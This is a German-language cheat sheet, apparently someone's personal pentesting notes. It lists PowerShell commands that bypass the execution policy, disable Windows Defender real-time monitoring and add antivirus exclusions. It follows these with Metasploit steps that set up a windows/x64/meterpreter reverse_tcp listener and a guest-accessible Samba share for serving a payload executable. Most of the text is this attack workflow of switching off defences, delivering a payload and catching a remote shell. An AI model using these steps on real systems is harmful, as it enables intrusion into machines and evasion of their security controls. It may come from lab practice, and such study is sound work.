# Notizen – 81a5terfr34k

Windows Richtlinien mit Powershell Befehlen setzen (SET) ODER Anzeigen (Get):
>>>> Ausführungsrichtlinien anzeigen <<<<
PS> Get-ExecutionPolicy
>>>> skriptausführung zulassen <<<<
PS> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
>>>> Antivirenscanner ausschalten <<<<
PS> Set-MpPreference -DisableRealtimeMonitoring $true
>>>> Antivirenscanner einschalten <<<<
PS> Set-MpPreference -DisableRealtimeMonitoring $false
>>>> Ausnahmen hinzufügen <<<<
Add-MpPreference -ExclusionExtension ".exe" ODER ".ps1"
Add-MpPreference -ExclusionPath "C:\Lokaler-Pfad" ODER "\\192.168.x.x\SMB-Pfad"


-> Script ausführen mit:
PS> .\<scriptname>.ps1

Linux:
--> Payload erstellen:
$ msfvenom
 
--> Meterpreter sitzung Listener:
$ msfconsole
msf6> use exploit/multi/handler
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST <kali IP>
msf6> set LPORT 4444
msf6> set ExitOnSession false
msf6> exploit -j

--> smbshare Ordner erstellen:
$ sudo mkdir -p /srv/smbshare
$ sudo chmod -R 777 /srv/smbshare

--> Payload nach smbshare Ordner verschieben:
$ mv ~/Schreibtisch/PayloadStub.exe /srv/smbshare/

--> Inhalt von smbshare kontrollieren:
$ ls -l /srv/smbshare

--> SMB Dienst starten:
$ sudo systemctl start smbd

--> SMB Dienst status prüfen:
$ sudo systemctl status smbd

--> Zugriff auf smbshare testen:
$ smbclient //localhost/share -N

--> aktive Samba Konfiguration anzeigen:
$ testparm ( /etc/samba/smb.conf)

--> Samba Konfigurations-DATEI bearbeiten:
$ sudo nano /etc/samba/smb.conf  
--> NEUEN [share]-Block ganz unten im dokument erstellen mit:
[share]
   path = /srv/smbshare
   browsable = yes
   read only = no
   guest ok = yes
--> zusätzlich im [global]-Block ergänzen:
   map to guest = Bad User
--> speichern mit strg+0 und schliessen mit strg+x

--> SMB Dienst neu starten:
$ sudo systemctl restart smbd
